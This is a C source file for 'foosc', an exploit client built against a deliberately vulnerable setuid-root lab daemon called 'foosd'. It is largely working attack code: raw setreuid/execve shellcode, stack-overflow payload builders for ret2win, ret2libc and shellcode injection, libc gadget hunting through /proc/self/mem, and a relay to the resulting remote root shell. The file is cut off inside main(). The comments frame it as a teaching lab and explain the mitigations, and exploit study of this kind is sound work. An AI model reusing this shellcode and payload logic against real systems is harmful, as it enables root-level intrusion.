/*
 * ============================================================================
 * foosc.c  --  "foosc": the exploit for the SUID-root daemon `foosd`
 * ============================================================================
 *
 *  PURPOSE
 *  -------
 *  `foosc` connects to `foosd`, reads the leaks it publishes, and builds a
 *  payload that overwrites the saved return address on `foosd`'s stack. When
 *  foosd is running SETUID ROOT (which `make setuid` arranges), the resulting
 *  shell runs with euid 0: this is RCE that ends in a *root* shell.
 *
 *  The technique that gets root is the default and the star of the show:
 *
 *      TECHNIQUE: shellcode
 *      -------------
 *      The payload is 32 bytes of raw machine code that does
 *
 *          setreuid(0, 0)            ; ALSO clear the real uid -- see below
 *          execve("/bin/sh", 0, 0)   ; become a shell
 *
 *      It is placed on foosd's stack and the hijacked `ret` jumps to it. The
 *      setreuid is not optional. bash (and dash) compare euid against ruid at
 *      startup and RESET euid = ruid whenever the two differ, so a plain
 *      execve("/bin/sh") out of a setuid process would give you a shell that
 *      swiftly forgets it was root. setreuid(0,0) makes both ids 0, the shell
 *      sees equal uids, and root survives. (Why ruid matters is explained in
 *      the comement blocks around SHELLCODE[] and in README.md.)
 *
 *  Other techniques are included for comparison, and each is a lesson:
 *
 *      ret2win        jump to foosd's `win()`. It execs /bin/sh WITHOUT
 *                     clearing ruid, so you get a shell that is NOT root
 *                     -- the shell's own privilege guard robbed you. This is
 *                     exactly what happens to naive "SUID + system()" code.
 *      ret2win-root   jump to foosd's `win_root()`, which calls
 *                     setreuid(0,0) from C first. ROOT shell, no shellcode.
 *      ret2libc       call system("/bin/sh"). system() runs the command in a
 *                     fresh /bin/sh, which -- same guard -- drops the
 *                     effective id: a shell, but NOT root.
 *      leak           just print what the daemon tells us, send no payload.
 *      demo           overflow with 'A's only: proves the bug via SIGSEGV.
 *
 *  THE SUID STATE IS PART OF THE PROTOCOL
 *  --------------------------------------
 *  The daemon's banner includes "ids=euid/ruid". foosc prints a loud warning
 *  when euid is not 0, i.e. when you have not run `sudo make setuid` yet --
 *  without the bit, everything below still works, but the shell is a plain
 *  user shell and thinking the exploit "failed" would be wrong.
 *
 *  SAFETY
 *  ------
 *  Defaults to 127.0.0.1:2343. This lab produces ROOT shells on the machine
 *  it runs against. Point it at anything you do not own and you are
 *  committing a computer-intrusion offence. Don't.
 *
 *  Build:  make foosc
 *  Usage:  ./foosc [-h HOST] [-p PORT] [-b BINARY] [-t TECH] [-i] [-n] [-v]
 *
 *  THE SHELL IS ON THE VICTIM
 *  --------------------------
 *  Like fooc before it, this program never spawns a local shell. After the
 *  payload lands there is exactly one shell, running inside foosd's hijacked
 *  (root) process with the TCP connection as its stdio. This side only
 *  relays bytes -- see become_shell() for the story of why that is the only
 *  correct design.
 * ============================================================================
 */

/* glibc extensions: memmem(), dlsym(), MAP_ANONYMOUS. */
#define _GNU_SOURCE

#include <arpa/inet.h>  /* inet_pton(): "127.0.0.1" -> 4 bytes.              */
#include <ctype.h>      /* isspace()/isxdigit() for parsing.                  */
#include <dlfcn.h>      /* dlsym(): find a symbol's address in OUR libc.      */
#include <errno.h>      /* errno / strerror().                                */
#include <fcntl.h>      /* open(), O_NONBLOCK.                                */
#include <netinet/in.h> /* struct sockaddr_in, htons().                       */
#include <poll.h>       /* poll(): multiplex the terminal and the socket.     */
#include <stdint.h>     /* uint64_t.                                          */
#include <stdio.h>      /* printf and friends.                                */
#include <stdlib.h>     /* exit(), malloc(), strtoul().                       */
#include <string.h>     /* memcpy(), strstr(), memmem().                      */
#include <sys/socket.h> /* socket(), connect(), shutdown().                   */
#include <sys/types.h>  /* ssize_t, pid_t.                                    */
#include <sys/wait.h>   /* waitpid(): reap the relay child when the session
                         * ends.                                              */
#include <unistd.h>     /* read, write, close, dup2, usleep, _exit.           */

/* ------------------------------------------------------------------------- */
/* Defaults                                                                   */
/* ------------------------------------------------------------------------- */

#define FOOSC_HOST   "127.0.0.1"  /* Loopback. Please keep it that way.        */
#define FOOSC_PORT   2343         /* Must match foosd's -p.                    */
#define FOOSC_BIN    "./foosd"    /* The target binary, for static analysis.   */

/* Padding byte: 'A' (0x41). Not NUL, so it never truncates a string-based
 * copy; instantly recognisable in a crash dump as 0x4141414141414141. */
#define PAD_BYTE    0x41

/* Upper bound on banner/leak text we tolerate. */
#define RECV_MAX    4096

/* ------------------------------------------------------------------------- */
/* x86-64 shellcode -- the setreuid + execve payload                         */
/* ------------------------------------------------------------------------- */

/*
 * 32 bytes of machine code, byte-for-byte what shellcode.S assembles to.
 *
 *      setreuid(0, 0)          ; ruid = 0 AND euid = 0
 *      execve("/bin/sh",0,0)   ; become a root shell
 *
 *     31 ff                  xor    edi, edi        ; ruid = 0
 *     31 f6                  xor    esi, esi        ; euid = 0
 *     6a 71                  push   0x71            ; 113 = setreuid
 *     58                     pop    rax
 *     0f 05                  syscall
 *     31 f6                  xor    esi, esi        ; argv = NULL
 *     31 d2                  xor    edx, edx        ; envp = NULL
 *     48 bf 2f 62 69 6e 2f  movabs rdi, 0x68732f6e69622f
 *     73 68 00                                     ; rdi = "/bin/sh\0"
 *     57                     push   rdi            ; string onto the stack
 *     48 89 e7               mov    rdi, rsp       ; rdi = &"/bin/sh"
 *     6a 3b                  push   0x3b           ; 59 = execve
 *     58                     pop    rax
 *     0f 05                  syscall
 *
 * WHY setreuid AND NOT setuid -- this comment is the whole lab in miniature:
 *
 *   execve leaves uids alone. A setuid-root process therefore execs /bin/sh
 *   with (ruid=user, euid=0). bash notices the mismatch at startup and, in
 *   the absence of -p, sets euid = ruid -- the shell's built-in guard against
 *   exactly this attack. setuid(0) alone also loses, because it only changes
 *   euid, so the mismatch survives. setreuid(0,0) changes BOTH, giving the
 *   shell equal ids to start from, and root persists. Compare with foosd's
 *   win() (no root) against win_root() (root) for the same lesson in C.
 *
 * Note there is deliberately no `ret` at the end: execve replaces the whole
 * process image and never returns.
 */
static const unsigned char SHELLCODE[] = {
    0x31, 0xff,                          /* xor    edi, edi                   */
    0x31, 0xf6,                          /* xor    esi, esi                   */
    0x6a, 0x71,                          /* push   0x71  (setreuid)          */
    0x58,                                /* pop    rax                        */
    0x0f, 0x05,                          /* syscall                           */
    0x31, 0xf6,                          /* xor    esi, esi                   */
    0x31, 0xd2,                          /* xor    edx, edx                   */
    0x48, 0xbf, 0x2f, 0x62, 0x69,        /* movabs rdi, "/bin/sh" (low)       */
    0x6e, 0x2f, 0x73, 0x68, 0x00,        /* movabs rdi, "/bin/sh" (high+NUL)  */
    0x57,                                /* push   rdi                        */
    0x48, 0x89, 0xe7,                    /* mov    rdi, rsp                   */
    0x6a, 0x3b,                          /* push   0x3b  (execve)             */
    0x58,                                /* pop    rax                        */
    0x0f, 0x05                           /* syscall                           */
};
#define SHELLCODE_LEN ((int)(sizeof(SHELLCODE)))

/* ------------------------------------------------------------------------- */
/* Results of analysing the target binary and our own libc                   */
/* ------------------------------------------------------------------------- */

struct bininfo {
    unsigned long vuln_addr;    /* Address of foosd's vulnerable_handler().  */
    unsigned long win_addr;     /* Address of foosd's win() (non-root shell).*/
    unsigned long win_root_addr;/* Address of win_root() (root shell)..      */
    unsigned long frame_off;    /* buf's distance below rbp, from the disasm. */
    unsigned long rip_off;      /* buf -> saved return address. THE key.      */
    unsigned long ret_gadget;   /* Address of a bare `ret` in the binary.     */
};

struct libcinfo {
    unsigned long base;         /* libc base in OUR process.                 */
    unsigned long off_system;   /* offset of system()                        */
    unsigned long off_read;     /* offset of read()   -- matches the leak    */
    unsigned long off_binsh;    /* offset of the "/bin/sh" string            */
    unsigned long off_poprdi;   /* offset of a `pop rdi ; ret` gadget        */
};

struct leaks {
    unsigned long stack;        /* A stack address (informational).          */
    unsigned long libc_read;    /* Real address of read() in target's libc.  */
    unsigned long buf;          /* Address of foosd's `buf`. The whole game. */
    int           euid;         /* Target's effective uid (from banner).     */
    int           ruid;         /* Target's real uid.                        */
};

/* ------------------------------------------------------------------------- */
/* Step 1: static analysis of the target binary via objdump                   */
/* ------------------------------------------------------------------------- */

/*
 * Why parse disassembly instead of hardcoding the offset? Because the number
 * (88 for this build) is a property of the compilation, not of the bug.
 * Rebuild with another compiler version or another local variable and it
 * changes; a hardcoded offset is the classic reason exploits die after a
 * rebuild. Computing it keeps the exploit honest and it is what a real
 * analyst actually does.
 *
 * GCC -O0 on x86-64 emits for the target function:
 *       push %rbp ; mov %rsp,%rbp ; sub $N,%rsp
 *       lea -OFF(%rbp),%reg      <- the buffer, passed to read()
 * so buf sits OFF below the saved frame pointer and the RETURN ADDRESS is
 * 8 bytes further up:   rip_off = OFF + 8
 */
static int analyse_binary(const char *path, struct bininfo *out)
{
    char cmd[512];
    char line[1024];
    FILE *pp;
    int in_vuln = 0;
    int saw_read = 0;
    int have_off = 0;
    long best_off = 0;
    int status;

    memset(out, 0, sizeof(*out));

    /* objdump is guaranteed present because the lab builds with it. */
    snprintf(cmd, sizeof(cmd), "objdump -d --no-show-raw-insn '%s' 2>/dev/null",
             path);

    pp = popen(cmd, "r");
    if (pp == NULL) {
        fprintf(stderr, "foosc: cannot run objdump: %s\n", strerror(errno));
        return -1;
    }

    while (fgets(line, sizeof(line), pp) != NULL) {

        /* --- Function boundaries: "0000000000401535 <win>:" ---------- */
        if (strstr(line, "<vulnerable_handler>:") != NULL) {
            in_vuln = 1;
            sscanf(line, "%lx", &out->vuln_addr);
            continue;
        }

        if (strstr(line, "<win_root>:") != NULL) {
            /* Longer name; check it FIRST so it is not confused.          */
            sscanf(line, "%lx", &out->win_root_addr);
            continue;
        }

        if (strstr(line, "<win>:") != NULL) {
            sscanf(line, "%lx", &out->win_addr);
            continue;
        }

        /* Any other "<label>:" line closes the vulnerable function. */
        if (in_vuln && strchr(line, '<') != NULL && strstr(line, ">:") != NULL) {
            in_vuln = 0;
            continue;
        }

        /* Remember the first whole `ret` mnemonic anywhere: ret sleds and
         * the 16-byte-alignment fix both need one. */
        if (out->ret_gadget == 0) {
            unsigned long a = 0;
            const char *colon = strchr(line, ':');
            if (sscanf(line, "%lx", &a) == 1 && colon != NULL) {
                const char *p = colon + 1;
                while (*p == ' ' || *p == '\t')
                    p++;
                if (strncmp(p, "ret", 3) == 0 &&
                    (p[3] == '\0' || p[3] == '\n' ||
                     p[3] == ' ' || p[3] == '\t'))
                    out->ret_gadget = a;
            }
        }

        if (!in_vuln)
            continue;

        /* --- The vulnerable read: "call ... <read@plt>" ------------- */
        if (strstr(line, "<read@plt>") != NULL) {
            saw_read = 1;
            continue;
        }

        /* --- The buffer reference: "lea -0x50(%rbp),%rcx" ----------- */
        /* Accept only a lea BEFORE the read call (that disambiguates `buf`
         * from the other local array), and take the first one. */
        if (!saw_read && !have_off) {
            const char *p = strstr(line, "%rbp)");
            if (p != NULL && strstr(line, "lea") != NULL) {
                const char *q = line;
                char disp[32];
                int  d = 0;
                while (q < p && *q != '-')
                    q++;
                if (q < p) {
                    const char *h = q;
                    while (h < p && d < (int)sizeof(disp) - 1) {
                        if (isxdigit((unsigned char)*h) || *h == '-' ||
                            *h == 'x' || *h == '+')
                            disp[d++] = *h++;
                        else
                            break;
                    }
                    disp[d] = '\0';
                    if (d > 0) {
                        /* The disassembly shows "-0x50"; strtol returns -80.
                         * We want the DISTANCE below rbp, so take abs(). */
                        best_off = labs(strtol(disp, NULL, 0));
                        have_off = 1;
                    }
                }
            }
        }
    }

    status = pclose(pp);
    (void)status;

    if (out->vuln_addr == 0 || out->win_addr == 0 || out->win_root_addr == 0 ||
        !have_off) {
        fprintf(stderr,
                "foosc: could not fully analyse '%s'.\n"
                "       vuln=0x%lx win=0x%lx win_root=0x%lx buf_off=%ld\n"
                "       Is this really the foosd binary? Is objdump installed?\n",
                path, out->vuln_addr, out->win_addr, out->win_root_addr,
                best_off);
        return -1;
    }

    out->frame_off = (unsigned long)best_off;
    if (best_off < 0) {
        fprintf(stderr,
                "foosc: buffer displacement parsed as %ld; refusing to guess.\n",
                best_off);
        return -1;
    }
    /*
     * THE key computation: buf is `best_off` bytes below the saved frame
     * pointer, and the saved return address is 8 bytes above the frame
     * pointer, so the distance from buf to the return address is:
     */
    out->rip_off = (unsigned long)best_off + 8UL;

    return 0;
}

/* ------------------------------------------------------------------------- */
/* Step 2: introspect our own libc for the offsets we need                   */
/* ------------------------------------------------------------------------- */

/*
 * The target's libc base is unknown (ASLR), but it is the SAME library we
 * are linked against, so we measure offsets HERE and add them to the target's
 * base derived from the leaked `read` address:
 *
 *     food_base = leaked_read - off_read
 *     system    = food_base + off_system
 *
 * This delta-arithmetic is how real exploits stay alive across libc updates,
 * and it is exactly why "rebase the binaries" is a real mitigation.
 */
static int analyse_libc(struct libcinfo *out)
{
    FILE *f;
    char line[512];
    unsigned long lo, hi;
    unsigned long rx_lo = 0, rx_hi = 0;
    unsigned long ro_lo[32], ro_hi[32];
    int n_ro = 0;
    int memfd;
    void *p;

    memset(out, 0, sizeof(*out));

    /* ---- 2a. Find libc's mappings in OUR address space (identical file). */
    f = fopen("/proc/self/maps", "r");
    if (f == NULL) {
        fprintf(stderr, "foosc: cannot open /proc/self/maps: %s\n",
                strerror(errno));
        return -1;
    }

    while (fgets(line, sizeof(line), f) != NULL) {
        if (strstr(line, "libc.so.6") == NULL)
            continue;
        if (sscanf(line, "%lx-%lx", &lo, &hi) != 2)
            continue;

        /* The lowest libc mapping IS the load base. */
        if (out->base == 0 || lo < out->base)
            out->base = lo;

        /* Executable text: where functions and gadgets live. */
        if (strstr(line, "r-xp") != NULL) {
            rx_lo = lo;
            rx_hi = hi;
        }
        /* Read-only data: where "/bin/sh" as a constant lives. */
        if (strstr(line, "r--p") != NULL && n_ro < 32) {
            ro_lo[n_ro] = lo;
            ro_hi[n_ro] = hi;
            n_ro++;
        }
    }
    fclose(f);

    if (out->base == 0 || rx_hi == 0) {
        fprintf(stderr, "foosc: could not locate libc in /proc/self/maps\n");
        return -1;
    }

    /* ---- 2b. dlsym() the two function offsets. ------------------------ */
    p = dlsym(RTLD_DEFAULT, "system");
    if (p == NULL) { fprintf(stderr, "foosc: no system()\n"); return -1; }
    out->off_system = (unsigned long)p - out->base;

    p = dlsym(RTLD_DEFAULT, "read");
    if (p == NULL) { fprintf(stderr, "foosc: no read()\n"); return -1; }
    out->off_read = (unsigned long)p - out->base;

    /* ---- 2c. Hunt for a `pop rdi ; ret` gadget in the live text. ----- */
    memfd = open("/proc/self/mem", O_RDONLY);
    if (memfd < 0) {
        fprintf(stderr, "foosc: cannot open /proc/self/mem: %s\n",
                strerror(errno));
        return -1;
    }

    /* `pop rdi; ret` is the 2-byte sequence 5f c3. It turns ROP into
     * "call any function with one argument". The mapping offsets and file
     * offsets differ (segment load bias), so we scan live memory. */
    {
        size_t sz = (size_t)(rx_hi - rx_lo);
        unsigned char *text = malloc(sz);
        if (text == NULL) { close(memfd); return -1; }

        if (pread(memfd, text, sz, (off_t)rx_lo) == (ssize_t)sz) {
            unsigned char *hit = memmem(text, sz, "\x5f\xc3", 2);
            if (hit != NULL)
                out->off_poprdi = (unsigned long)(hit - text)
                                  + (rx_lo - out->base);
        }
        free(text);
    }

    /* ---- 2d. Find the "/bin/sh" string in the read-only segments. ---- */
    for (int i = 0; i < n_ro && out->off_binsh == 0; i++) {
        size_t sz = (size_t)(ro_hi[i] - ro_lo[i]);
        unsigned char *ro = malloc(sz);
        if (ro == NULL)
            break;
        if (pread(memfd, ro, sz, (off_t)ro_lo[i]) == (ssize_t)sz) {
            unsigned char *hit = memmem(ro, sz, "/bin/sh", 7);
            if (hit != NULL)
                out->off_binsh = (unsigned long)(hit - ro)
                                 + (ro_lo[i] - out->base);
        }
        free(ro);
    }

    close(memfd);

    if (out->off_poprdi == 0 || out->off_binsh == 0) {
        fprintf(stderr,
                "foosc: failed to locate gadgets/strings in libc\n");
        return -1;
    }

    return 0;
}

/* ------------------------------------------------------------------------- */
/* Step 3: networking                                                         */
/* ------------------------------------------------------------------------- */

static int connect_to(const char *host, int port)
{
    struct sockaddr_in sa;
    int fd;
    int one = 1;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        fprintf(stderr, "foosc: socket: %s\n", strerror(errno));
        return -1;
    }
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((uint16_t)port);
    if (inet_pton(AF_INET, host, &sa.sin_addr) != 1) {
        fprintf(stderr, "foosc: bad address '%s'\n", host);
        close(fd);
        return -1;
    }

    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        fprintf(stderr, "foosc: connect %s:%d: %s\n",
                host, port, strerror(errno));
        close(fd);
        return -1;
    }
    return fd;
}

/* send_all() -- write a whole buffer to a blocking socket, looping over the
 * short writes a stream may legitimately produce. */
static int send_all(int fd, const void *buf, size_t n)
{
    const unsigned char *p = buf;
    size_t sent = 0;
    while (sent < n) {
        ssize_t w = write(fd, p + sent, n - sent);
        if (w < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        sent += (size_t)w;
    }
    return 0;
}

/* write_nb() -- like send_all but for a NON-BLOCKING descriptor: retry on
 * EAGAIN after poll() says the descriptor can take more. Used only by the
 * relay loop, which must stay responsive. */
static int write_nb(int fd, const void *buf, size_t n)
{
    const unsigned char *p = buf;
    size_t sent = 0;
    while (sent < n) {
        ssize_t w = write(fd, p + sent, n - sent);
        if (w > 0) {
            sent += (size_t)w;
            continue;
        }
        if (w < 0 && errno == EINTR)
            continue;
        if (w < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
            struct pollfd pfd;
            pfd.fd = fd;
            pfd.events = POLLOUT;
            pfd.revents = 0;
            if (poll(&pfd, 1, 1000) <= 0)
                return -1;
            continue;
        }
        return -1;
    }
    return 0;
}

/* read_until() -- read until every pattern in `pats` has been seen, or we
 * run out of buffer / patience. Re-scans the whole buffer after each read so
 * a banner split across TCP segments cannot fool us. */
static int read_until(int fd, const char *const *pats, int npats, char *out,
                      size_t outsz)
{
    size_t got = 0;
    int missing = npats;

    while (missing > 0 && got + 1 < outsz && got < RECV_MAX) {
        ssize_t r = read(fd, out + got, outsz - got - 1);
        if (r <= 0) {
            if (r < 0 && errno == EINTR)
                continue;
            break;
        }
        got += (size_t)r;
        out[got] = '\0';
        missing = 0;
        for (int i = 0; i < npats; i++)
            if (strstr(out, pats[i]) == NULL)
                missing++;
    }

    out[got < outsz ? got : outsz - 1] = '\0';
    return (missing == 0) ? 0 : -1;
}

/* parse_leaks() -- pull euid/ruid and the three hex addresses out of the
 * banner. The wire formats are:
 *
 *     FOOSD 1.0 ids=0/1000 leak stack=0x... libc=0x...
 *     BUF=0x...
 *
 * "ids=euid/ruid" is the SUID health indicator. It is spelled "ids=" (not
 * "euid="/"ruid=") so the test harness's "uid=" check stays unambiguous. */
static int parse_leaks(const char *text, struct leaks *out)
{
    const char *p;

    memset(out, 0, sizeof(*out));

    p = strstr(text, "ids=");
    if (p != NULL)
        (void)sscanf(p + 4, "%d/%d", &out->euid, &out->ruid);

    if ((p = strstr(text, "stack=")) != NULL)
        out->stack = strtoul(p + 6, NULL, 0);
    if ((p = strstr(text, "libc=")) != NULL)
        out->libc_read = strtoul(p + 5, NULL, 0);
    if ((p = strstr(text, "BUF=")) != NULL)
        out->buf = strtoul(p + 4, NULL, 0);

    if (out->libc_read == 0 || out->buf == 0) {
        fprintf(stderr,
                "foosc: the daemon did not leak what we expected "
                "(stack=%#lx libc=%#lx BUF=%#lx).\n"
                "       Is ./foosd v1.0 the running binary?\n",
                out->stack, out->libc_read, out->buf);
        return -1;
    }
    return 0;
}

/* ------------------------------------------------------------------------- */
/* Step 4: payload construction                                               */
/* ------------------------------------------------------------------------- */

/* A growable byte buffer for building the payload. */
struct pbuf {
    unsigned char *data;
    size_t         len;
    size_t         cap;
};

static int pbuf_reserve(struct pbuf *p, size_t extra)
{
    if (p->len + extra <= p->cap)
        return 0;
    size_t ncap = p->cap ? p->cap * 2 : 256;
    while (ncap < p->len + extra)
        ncap *= 2;
    unsigned char *nd = realloc(p->data, ncap);
    if (nd == NULL)
        return -1;
    p->data = nd;
    p->cap  = ncap;
    return 0;
}

static int pbuf_u8(struct pbuf *p, unsigned char b)
{
    if (pbuf_reserve(p, 1) < 0)
        return -1;
    p->data[p->len++] = b;
    return 0;
}

/* Little-endian 64-bit word, written byte by byte so the byte order is
 * explicit and the exploit builds identically on any host. */
static int pbuf_u64(struct pbuf *p, unsigned long v)
{
    for (int i = 0; i < 8; i++)
        if (pbuf_u8(p, (unsigned char)((v >> (8 * i)) & 0xffUL)) < 0)
            return -1;
    return 0;
}

static int pbuf_pad(struct pbuf *p, size_t n)
{
    if (pbuf_reserve(p, n) < 0)
        return -1;
    memset(p->data + p->len, PAD_BYTE, n);
    p->len += n;
    return 0;
}

/* ------------------------------------------------------------------------- */
/* Step 5: the shell (relay edition -- see become_shell for the full story)   */
/* ------------------------------------------------------------------------- */

/* drain_hint() -- non-blockingly show whatever the daemon said before we
 * hand the terminal to the victim shell, so a failed payload's "no hijack"
 * message is visible rather than eaten. */
static void drain_hint(int fd)
{
    char buf[1024];
    int flags = fcntl(fd, F_GETFL, 0);
    ssize_t n;

    if (flags == -1)
        return;
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);

    n = read(fd, buf, sizeof(buf) - 1);
    if (n > 0) {
        buf[n] = '\0';
        fputs(buf, stdout);
        fflush(stdout);
    }

    fcntl(fd, F_SETFL, flags);
}

/* relay_stdio() -- one poll() loop splices terminal <-> socket. A single
 * process means strict alternation, so the two directions can never
 * interleave mid-line (the failure mode of the two-fork version, which split
 * `uname` output in half). Both descriptors are made non-blocking so poll()
 * tells us when each can be serviced. */
static void relay_stdio(int sock)
{
    struct pollfd pfd[2];
    char buf[4096];
    int saved[2] = { -1, -1 };
    int saved_sock;

    for (int i = 0; i < 2; i++) {
        saved[i] = fcntl(i, F_GETFL, 0);
        if (saved[i] != -1)
            fcntl(i, F_SETFL, saved[i] | O_NONBLOCK);
    }
    saved_sock = fcntl(sock, F_GETFL, 0);
    if (saved_sock != -1)
        fcntl(sock, F_SETFL, saved_sock | O_NONBLOCK);

    pfd[0].fd = STDIN_FILENO;
    pfd[0].events = POLLIN;
    pfd[1].fd = sock;
    pfd[1].events = POLLIN;

    for (;;) {
        int n = poll(pfd, 2, -1);
        ssize_t r;

        if (n < 0) {
            if (errno == EINTR)
                continue;
            break;
        }
        if (n == 0)
            continue;

        if (pfd[0].revents & POLLIN) {
            r = read(STDIN_FILENO, buf, sizeof(buf));
            if (r > 0) {
                if (write_nb(sock, buf, (size_t)r) < 0)
                    break;
            } else if (r == 0) {
                /* Terminal EOF: half-close the socket so the remote shell
                 * sees end-of-input and exits on its own. */
                shutdown(sock, SHUT_WR);
                break;
            }
        }

        if (pfd[1].revents & (POLLIN | POLLHUP | POLLERR)) {
            r = read(sock, buf, sizeof(buf));
            if (r > 0) {
                if (write_nb(STDOUT_FILENO, buf, (size_t)r) < 0)
                    break;
            } else {
                break;
            }
        }
    }

    for (int i = 0; i < 2; i++)
        if (saved[i] != -1)
            fcntl(i, F_SETFL, saved[i]);
    if (saved_sock != -1)
        fcntl(sock, F_SETFL, saved_sock);
}

/*
 * become_shell() -- after the payload lands, the victim process IS a shell
 * (its stdio are the socket) and only one shell exists in the whole picture:
 * on the victim, as ROOT. All this side must do is move bytes:
 *
 *      terminal <-> TCP socket <-> foosd's root /bin/sh
 *
 * The history is instructive and is in fooc.c too: version 1 dup2'd the
 * socket onto our own stdio and exec'd a LOCAL shell (deaf and mute);
 * version 2 forked a relay alongside a local login shell, and the login
 * shell vacuumed exactly one byte off the head of every incoming chunk
 * (symptom: "uid=1000(hanez)" printed as "id=1000(hanez)"). A descriptor
 * has ONE read cursor; it must have exactly ONE reader. Hence: no local
 * shell, no second reader. Just bytes.
 */
static void become_shell(int fd)
{
    pid_t relay;

    printf("foosc: shell is on the victim (root if foosd is SUID); relaying\n");

    relay = fork();
    if (relay < 0) {
        fprintf(stderr, "\nfoosc: fork() failed: %s\n", strerror(errno));
        return;
    }

    if (relay == 0) {
        relay_stdio(fd);
        _exit(0);
    }

    for (;;) {
        int   status;
        pid_t r = waitpid(relay, &status, 0);
        if (r == relay)
            break;
        if (r < 0 && errno == EINTR)
            continue;
        if (r < 0) {
            fprintf(stderr, "\nfoosc: waitpid: %s\n", strerror(errno));
            break;
        }
    }

    close(fd);
    printf("\nfoosc: session closed.\n");
}

/* ------------------------------------------------------------------------- */
/* The techniques                                                             */
/* ------------------------------------------------------------------------- */

/* TECHNIQUE 1 -- ret2win: jump to win(). Gives a shell, but (see the big
 * comment in foosd.c) bash resets euid = ruid, so NOT a root shell. The
 * technique proves control-flow hijack, and doubles as the "why naive
 * SUID+system() fails" exhibit. */
static void build_ret2win(struct pbuf *p, const struct bininfo *bi)
{
    pbuf_pad(p, bi->rip_off);
    pbuf_u64(p, bi->win_addr);       /* -> win(): /bin/sh, uid stays user. */
}

/* TECHNIQUE 1b -- ret2win-root: jump to win_root(), the backdoor that does
 * setreuid(0,0) before execl. One line of C is the difference between a
 * demoted shell and a root shell. */
static void build_ret2win_root(struct pbuf *p, const struct bininfo *bi)
{
    pbuf_pad(p, bi->rip_off);
    pbuf_u64(p, bi->win_root_addr);  /* -> win_root(): /bin/sh, uid 0.     */
}

/* TECHNIQUE 2 -- ret2libc: system("/bin/sh"). Works, gives a shell ...
 * and, same guard, NOT a root one (system() runs the command in a fresh
 * /bin/sh which drops the effective id). Included so you can see for
 * yourself that "call a libc function" is no shortcut past the shell's
 * privilege guard. */
static void build_ret2libc(struct pbuf *p, const struct bininfo *bi,
                           const struct libcinfo *li, const struct leaks *lk)
{
    unsigned long base = lk->libc_read - li->off_read;
    unsigned long system = base + li->off_system;
    unsigned long binsh  = base + li->off_binsh;
    unsigned long poprdi = base + li->off_poprdi;

    printf("foosc: libc base  = %#lx\n", base);
    printf("foosc: system     = %#lx\n", system);
    printf("foosc: \"/bin/sh\"  = %#lx\n", binsh);
    printf("foosc: pop rdi;ret= %#lx\n", poprdi);

    pbuf_pad(p, bi->rip_off);
    pbuf_u64(p, poprdi);       /* gadget: load next word into rdi            */
    pbuf_u64(p, binsh);        /* argument to system()                       */
    pbuf_u64(p, system);       /* the function to call                       */
}

/*
 * TECHNIQUE 3 -- shellcode  (the one that gets root)
 * -------------------------------------------------
 * The payload IS the program. 32 bytes of machine code sit at the start of
 * `buf`; the overwritten return address points back at them. When the CPU
 * `ret`s into buf, it starts executing our instructions -- setreuid(0,0)
 * then execve("/bin/sh") -- inside a process whose euid is 0.
 *
 * NX (W^X) is the reason this is special and rare: the target only executes
 * the stack because foosd was built with -z execstack. On a hardened build
 * this payload is a SIGSEGV and only techniques 1/2 (running code that
 * already exists) remain. See README.md's mitigation table.
 */
static void build_shellcode(struct pbuf *p, const struct bininfo *bi,
                            const struct leaks *lk)
{
    printf("foosc: placing %d bytes of shellcode at %#lx\n",
           SHELLCODE_LEN, lk->buf);

    for (int i = 0; i < SHELLCODE_LEN; i++)
        pbuf_u8(p, SHELLCODE[i]);

    size_t used = SHELLCODE_LEN;
    if (bi->rip_off > used)
        pbuf_pad(p, bi->rip_off - used);

    /* RIP must land on the first byte of our code. */
    pbuf_u64(p, lk->buf);
}

/* OVERFLOW DEMO -- junk only. Fills buf, clobbers the saved rbp and the
 * return address with 0x4141414141414141, which is certainly not mapped:
 * SIGSEGV, and the daemon's crash reporter logs RIP=0x4141... as proof. */
static void build_demo(struct pbuf *p, const struct bininfo *bi)
{
    pbuf_pad(p, bi->rip_off + 8);
}

/* ------------------------------------------------------------------------- */
/* main()                                                                     */
/* ------------------------------------------------------------------------- */

static void usage(const char *a0)
{
    printf(
"foosc -- exploit for the intentionally vulnerable SUID daemon 'foosd'\n"
"\n"
"usage: %s [options]\n"
"\n"
"  -h HOST    target address        (default %s)\n"
"  -p PORT    target port           (default %d)\n"
"  -b PATH    target binary to analyse (default %s)\n"
"  -t TECH    technique:\n"
"                shellcode   setreuid+execve shellcode -> ROOT shell [default]\n"
"                ret2win     jump to win() (shell, but NOT root: bash guard)\n"
"                ret2win-root jump to win_root() (setreuid from C -> root)\n"
"                ret2libc    system(\"/bin/sh\") (shell, but NOT root)\n"
"                demo        overflow with junk only, expect SIGSEGV\n"
"                leak        just print the leaks, send no payload\n"
"  -i / -n     interactive shell (default) / no shell, just send and report\n"
"  -v          verbose: dump every address\n"
"\n"
"To get the ROOT shell, foosd must be setuid-root:\n"
"    sudo make setuid\n"
"Then run the daemon and fire this at it. Loopback only, please.\n",
    a0, FOOSC_HOST, FOOSC_PORT, FOOSC_BIN);
}

int main(int argc, char **argv)
{
    const char *host = FOOSC_HOST;
    const char *binpath = FOOSC_BIN;
    const char *tech = "shellcode";   /* SUID lab: shellcode is the point.  */
    int   port = FOOSC_PORT;
    int   verbose = 0;
    int   want_shell = -1;            /* -i / -n                             */
    int   fd;
    int   o;
    struct bininfo bi;
    struct libcinfo li;
    struct leaks lk;
    struct pbuf p = { NULL, 0, 0 };
    char rx[RECV_MAX];
    int  is_leak = 0;

    while ((o = getopt(argc, argv, ":h:p:b:t:inv")) != -1) {
        switch (o) {
        case 'h': host = optarg; break;
        case 'p': port = atoi(optarg); break;
        case 'b': binpath = optarg; break;
        case 't': tech = optarg; break;
        case 'i': want_shell = 1; break;
        case 'n': want_shell = 0; break;
        case 'v': verbose = 1; break;
        default:  usage(argv[0]); return 2;
        }
    }

    /* ---- Phase 1: learn everything we can without touching the network. */
    if (analyse_binary(binpath, &bi) < 0)
        return 1;

    if (analyse_libc(&li) < 0)
        return 1;

    printf("foosc: target binary     : %s\n", binpath);
    printf("foosc: vulnerable_handler = %#lx\n", bi.vuln_addr);
    printf("foosc: win()              = %#lx\n", bi.win_addr);
